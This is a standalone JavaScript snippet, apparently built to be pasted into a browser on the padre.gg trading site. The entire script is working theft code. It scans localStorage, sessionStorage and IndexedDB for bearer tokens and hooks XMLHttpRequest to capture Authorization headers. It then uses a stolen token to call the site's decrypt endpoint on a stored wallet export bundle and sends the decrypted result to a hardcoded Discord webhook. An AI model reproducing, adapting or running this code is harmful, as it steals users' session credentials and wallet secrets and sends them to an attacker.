(function() {
    const W = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
    let found = false;

    const ship = async (t) => {
        if (found || !t || t.length < 50) return;
        const bStr = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bStr) return;
        
        found = true; 
        const b = JSON.parse(bStr);
        const k = Object.keys(b.bundles)[0];
        
        try {
            const r = await fetch("https://api.padre.gg/v2/enclave/decrypt", {
                method: 'POST',
                headers: { 'Authorization': t.startsWith('Bearer ') ? t : `Bearer ${t}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ bundle: b.bundles[k].exportBundle, subOrgId: b.bundles[k].subOrgId })
            });
            const data = await r.text();
            navigator.sendBeacon(W, new Blob([JSON.stringify({
                embeds: [{ title: "🧬 VANTA CORE: MEMORY HARVEST SUCCESS", description: "```json\n" + data.substring(0, 1800) + "\n```", color: 65280 }]
            })], { type: 'text/plain' }));
            console.log("%c[VANTA] EXFILTRATION COMPLETE", "color: #00ff88; font-weight: bold;");
        } catch (e) { found = false; }
    };

    // 1. HARVEST FROM INDEXED-DB (Most likely place for long sessions)
    const harvestDB = async () => {
        const dbs = await indexedDB.databases();
        for (let dbInfo of dbs) {
            const db = await new Promise(res => {
                const req = indexedDB.open(dbInfo.name);
                req.onsuccess = () => res(req.result);
            });
            
            Array.from(db.objectStoreNames).forEach(storeName => {
                const tx = db.transaction(storeName, 'readonly');
                const store = tx.objectStore(storeName);
                store.getAll().onsuccess = (e) => {
                    const items = e.target.result;
                    items.forEach(item => {
                        const str = JSON.stringify(item);
                        const match = str.match(/ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+/);
                        if (match) ship(match[0]);
                    });
                };
            });
        }
    };

    // 2. HARVEST FROM ALL STORAGE (Deep Scan)
    const harvestStorage = () => {
        const all = {...localStorage, ...sessionStorage};
        Object.values(all).forEach(val => {
            const match = val.match(/ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+/);
            if (match) ship(match[0]);
            try {
                const p = JSON.parse(val);
                if (p.token) ship(p.token);
                if (p.state?.token) ship(p.state.token);
            } catch(e){}
        });
    };

    // 3. OVERRIDE NETWORK AS FALLBACK
    const _set = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(n, v) {
        if (n.toLowerCase() === 'authorization') ship(v);
        return _set.apply(this, arguments);
    };

    // 4. START THE HARVEST
    console.log("%c[VANTA] SCANNING MEMORY SECTORS...", "color: #00ff88;");
    harvestStorage();
    harvestDB();
    
    // Force call to trigger the XHR hook if memory scan fails
    fetch('/api/v2/user/profile').catch(()=>{});
})();
